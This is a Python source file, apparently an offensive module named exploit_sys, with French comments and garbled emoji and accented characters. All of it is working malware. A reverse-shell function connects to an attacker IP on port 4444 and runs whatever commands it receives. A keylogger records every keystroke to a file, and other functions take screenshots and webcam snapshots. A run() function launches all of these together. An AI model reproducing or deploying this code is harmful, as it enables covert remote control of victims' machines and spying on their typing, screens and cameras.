import os
import socket
import threading
from datetime import datetime

try:
    from pynput import keyboard
    import pyautogui
    import cv2
except ImportError:
    pass  # handled during run()

OUTPUT_DIR = "outputs"
KEYLOG_FILE = os.path.join(OUTPUT_DIR, "keylogs", "keylog.txt")
SCREENSHOT_FILE = os.path.join(OUTPUT_DIR, "screenshots", f"screenshot_{datetime.now().strftime('%H%M%S')}.png")
CAMERA_FILE = os.path.join(OUTPUT_DIR, "screenshots", f"camera_{datetime.now().strftime('%H%M%S')}.png")

keylogger_listener = None  # üîÅ Global pour arr√™ter plus tard

# üì° Reverse shell simple
def start_reverse_shell(attacker_ip="127.0.0.1", port=4444):
    try:
        s = socket.socket()
        s.connect((attacker_ip, port))
        s.send("[+] Shell connect√©\n".encode("utf-8"))

        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            output = os.popen(cmd).read()
            if not output:
                output = "Commande vide ou invalide.\n"
            s.send(output.encode())
        s.close()
    except Exception as e:
        print(f"[Shell] Erreur : {e}")

# üéπ Keylogger
def start_keylogger():
    global keylogger_listener
    if keylogger_listener is not None:
        print("[!] Keylogger d√©j√† actif.")
        return

    os.makedirs(os.path.dirname(KEYLOG_FILE), exist_ok=True)

    def on_press(key):
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            try:
                f.write(f"{key.char}")
            except AttributeError:
                f.write(f"[{key}]")

    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    print(f"[+] Keylogger actif. Fichier : {KEYLOG_FILE}")

# üõë Stop keylogger
def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None
        print("[+] Keylogger arr√™t√©.")
    else:
        print("[!] Aucun keylogger actif.")

# üì∏ Screenshot
def take_screenshot():
    os.makedirs(os.path.dirname(SCREENSHOT_FILE), exist_ok=True)
    image = pyautogui.screenshot()
    image.save(SCREENSHOT_FILE)
    print(f"[+] Screenshot enregistr√© : {SCREENSHOT_FILE}")

# üé• Webcam snapshot
def capture_camera():
    os.makedirs(os.path.dirname(CAMERA_FILE), exist_ok=True)
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(CAMERA_FILE, frame)
        print(f"[+] Capture webcam enregistr√©e : {CAMERA_FILE}")
    else:
        print("[Cam√©ra] Aucune image captur√©e.")
    cam.release()

# üöÄ Fonction principale
def run(target=None, mode="all", attacker_ip="127.0.0.1", port=4444):
    print(f"[*] Lancement exploit_sys en mode : {mode}")

    if mode in ["all", "shell"]:
        threading.Thread(target=start_reverse_shell, args=(attacker_ip, port)).start()

    if mode in ["all", "keylog"]:
        start_keylogger()

    if mode in ["all", "screenshot"]:
        take_screenshot()

    if mode in ["all", "camera"]:
        capture_camera()

    print("[*] exploit_sys termin√©.")